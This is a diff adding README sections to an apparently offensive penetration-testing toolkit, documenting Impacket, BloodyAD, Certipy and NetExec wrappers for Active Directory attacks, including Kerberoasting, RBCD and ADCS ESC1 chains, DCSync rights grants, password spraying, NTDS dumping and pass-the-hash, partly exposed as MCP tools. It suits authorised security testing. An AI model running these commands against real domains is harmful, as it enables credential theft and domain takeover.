@@ -13,6 +13,10 @@ UwU Toolkit integrates with external tools and services to enhance your penetrat
 ## Table of Contents
 
 - [Exegol Integration](#exegol-integration)
+- [Impacket](#impacket)
+- [BloodyAD](#bloodyad)
+- [Certipy](#certipy)
+- [NetExec](#netexec)
 - [Claude AI Integration](#claude-ai-integration)
 - [Sliver C2 Integration](#sliver-c2-integration)
 - [Penelope Shell Handler](#penelope-shell-handler)
@@ -95,6 +99,245 @@ ret, stdout, stderr = self.run_in_exegol(
     timeout=60
 )
 ```
+
+---
+
+## Impacket
+
+UwU Toolkit wraps [Impacket](https://github.com/fortra/impacket) through dedicated modules. Tools are auto-detected locally or inside Exegol — no manual path configuration needed.
+
+### Modules
+
+| Module | Description |
+|--------|-------------|
+| `ad/kerberoast` | Kerberoast — find and crack service account tickets |
+| `ad/asreproast` | AS-REP Roast — crack accounts without pre-auth |
+| `ad/targeted_kerberoast` | Kerberoast a specific user via SPN manipulation |
+| `ad/kerb_userenum` | Enumerate valid usernames via Kerberos |
+| `ad/delegation_exploit` | Exploit constrained/unconstrained delegation |
+| `ad/rbcd_auto` | Full RBCD attack chain (add computer, set delegation, get ticket) |
+
+### Examples
+
+```bash
+# Kerberoast
+uwu > use ad/kerberoast
+uwu kerberoast > set RHOSTS 10.10.10.100
+uwu kerberoast > set DOMAIN corp.local
+uwu kerberoast > set USER admin
+uwu kerberoast > set PASS Password123
+uwu kerberoast > run
+
+# AS-REP Roast
+uwu > use ad/asreproast
+uwu asreproast > set RHOSTS 10.10.10.100
+uwu asreproast > set DOMAIN corp.local
+uwu asreproast > run
+
+# RBCD attack chain
+uwu > use ad/rbcd_auto
+uwu rbcd_auto > set RHOSTS 10.10.10.100
+uwu rbcd_auto > set DOMAIN corp.local
+uwu rbcd_auto > set USER admin
+uwu rbcd_auto > set PASS Password123
+uwu rbcd_auto > set TARGET_COMPUTER DC01$
+uwu rbcd_auto > run
+```
+
+### MCP Tools
+
+When using UwU Toolkit via the MCP server, Impacket tools are available directly:
+
+| MCP Tool | Description |
+|----------|-------------|
+| `impacket_secretsdump` | Dump SAM/LSA/NTDS credentials |
+| `impacket_psexec` | Remote execution via SMB service |
+| `impacket_wmiexec` | Remote execution via WMI |
+| `impacket_smbexec` | Remote execution via SMB |
+| `impacket_dcomexec` | Remote execution via DCOM |
+| `impacket_getTGT` | Request a Kerberos TGT |
+| `impacket_getST` | Request a service ticket (S4U2Self/Proxy) |
+| `impacket_GetUserSPNs` | Kerberoast |
+| `impacket_GetNPUsers` | AS-REP Roast |
+| `impacket_addcomputer` | Add a machine account |
+| `impacket_rbcd` | Manage RBCD delegation |
+| `impacket_dacledit` | Edit DACLs on AD objects |
+| `impacket_findDelegation` | Find delegation configurations |
+| `impacket_mssqlclient` | Connect to MSSQL |
+| `impacket_smbclient` | Connect to SMB shares |
+| `impacket_lookupsid` | SID/RID brute-force enumeration |
+| `impacket_GetLAPSPassword` | Read LAPS passwords |
+| `impacket_GetGPPPassword` | Extract GPP passwords from SYSVOL |
+
+---
+
+## BloodyAD
+
+UwU Toolkit integrates [BloodyAD](https://github.com/CravateRouge/bloodyAD) for ACL enumeration and abuse.
+
+### Module
+
+```bash
+uwu > use ad/bloodyad_validate
+uwu bloodyad_validate > set RHOSTS 10.10.10.100
+uwu bloodyad_validate > set DOMAIN corp.local
+uwu bloodyad_validate > set USER admin
+uwu bloodyad_validate > set PASS Password123
+uwu bloodyad_validate > run
+```
+
+### MCP Tool
+
+The `bloodyad` MCP tool exposes all BloodyAD actions:
+
+| Action | Subcommands | Use |
+|--------|-------------|-----|
+| `get` | `writable`, `owned`, `object`, `membership`, `children`, `search` | Enumerate ACLs and objects |
+| `add` | `genericAll`, `dcsync`, `groupMember`, `computer`, `shadowCredentials`, `rbcd` | Grant permissions |
+| `set` | `password`, `owner`, `object`, `uac` | Modify objects |
+| `remove` | `genericAll`, `dcsync`, `groupMember` | Revoke permissions |
+
+### Common Operations
+
+```bash
+# Find what you can write to
+uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 get writable
+
+# Grant DCSync rights
+uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 add dcsync TARGET TRUSTEE
+
+# Add user to group
+uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 add groupMember GROUP USER
+
+# Force password reset
+uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 set password TARGET 'NewPass!'
+
+# Shadow Credentials
+uwu > !bloodyAD -u user -p pass -d corp.local --host 10.10.10.100 add shadowCredentials TARGET
+```
+
+---
+
+## Certipy
+
+UwU Toolkit wraps [Certipy](https://github.com/ly4k/Certipy) for ADCS enumeration and exploitation with modules for discovery, exploitation, and full automation.
+
+### Modules
+
+| Module | Description |
+|--------|-------------|
+| `ad/certipy_find` | Find vulnerable ADCS templates |
+| `ad/certipy_exploit` | Request certs and authenticate as target users |
+| `ad/adcs_auto` | Automated scan + exploit (ESC1/2/3/6/9) |
+
+### Examples
+
+**Find vulnerable templates:**
+
+```bash
+uwu > use ad/certipy_find
+uwu certipy_find > set RHOSTS 10.10.10.100
+uwu certipy_find > set DOMAIN corp.local
+uwu certipy_find > set USER admin
+uwu certipy_find > set PASS Password123
+uwu certipy_find > run
+```
+
+**Exploit ESC1:**
+
+```bash
+uwu > use ad/certipy_exploit
+uwu certipy_exploit > set RHOSTS 10.10.10.100
+uwu certipy_exploit > set DOMAIN corp.local
+uwu certipy_exploit > set USER admin
+uwu certipy_exploit > set PASS Password123
+uwu certipy_exploit > set CA CORP-CA
+uwu certipy_exploit > set TEMPLATE VulnTemplate
+uwu certipy_exploit > set TARGET_USER administrator
+uwu certipy_exploit > run
+```
+
+**Automated full chain:**
+
+```bash
+uwu > use ad/adcs_auto
+uwu adcs_auto > set RHOSTS 10.10.10.100
+uwu adcs_auto > set DOMAIN corp.local
+uwu adcs_auto > set USER admin
+uwu adcs_auto > set PASS Password123
+uwu adcs_auto > run
+```
+
+### MCP Tools
+
+| MCP Tool | Description |
+|----------|-------------|
+| `certipy_find` | Enumerate templates and find ESC vulnerabilities |
+| `certipy_req` | Request certificates with alternate UPN/DNS |
+| `certipy_auth` | Authenticate with a PFX certificate to get NT hash or TGT |
+| `certipy_shadow` | Shadow Credentials attack (add key creds, request cert, authenticate) |
+
+### Supported ESC Types
+
+ESC1, ESC2, ESC3, ESC6, ESC9 — the `adcs_auto` module handles all of these end-to-end.
+
+---
+
+## NetExec
+
+UwU Toolkit integrates [NetExec](https://github.com/Pennyw0rth/NetExec) (nxc) for multi-protocol credential testing and enumeration. Available as both a console shortcut and MCP tool.
+
+### Console Shortcut
+
+The `nxc` command is available directly in the UwU console:
+
+```bash
+# Validate credentials
+uwu > nxc smb 10.10.10.100 -u admin -p Password123 -d corp.local
+
+# Enumerate shares
+uwu > nxc smb 10.10.10.100 -u admin -p Password123 --shares
+
+# Enumerate users
+uwu > nxc smb 10.10.10.100 -u admin -p Password123 --users
+
+# Spray credentials
+uwu > nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success
+
+# Execute commands
+uwu > nxc smb 10.10.10.100 -u admin -p Password123 -x "whoami"
+
+# Dump NTDS
+uwu > nxc smb 10.10.10.100 -u admin -p Password123 --ntds
+
+# Read LAPS
+uwu > nxc ldap 10.10.10.100 -u admin -p Password123 -M laps
+
+# Pass-the-hash
+uwu > nxc smb 10.10.10.100 -u admin -H aad3b435:31d6cfe0d16ae931b73c59d7e0c089c0
+```
+
+### Common Actions
+
+| Action | Description |
+|--------|-------------|
+| `--shares` | List SMB shares with access levels |
+| `--users` | Enumerate domain users |
+| `--groups` | Enumerate domain groups |
+| `--sessions` | List active sessions |
+| `--sam` / `--lsa` / `--ntds` | Dump credentials |
+| `--rid-brute` | RID brute-force user enumeration |
+| `--pass-pol` | Dump password policy |
+| `-x "cmd"` / `-X "cmd"` | Execute cmd / PowerShell |
+| `-M module` | Run a NetExec module (laps, gmsa, spider_plus, etc.) |
+
+### Protocols
+
+SMB, LDAP, WinRM, RDP, MSSQL, SSH, WMI
+
+### MCP Tool
+
+The `netexec` MCP tool supports all protocols and actions with parameters for `target`, `protocol`, `domain`, `username`, `password`, `hashes`, `action`, `module`, `execute`, and more.
 
 ---
 
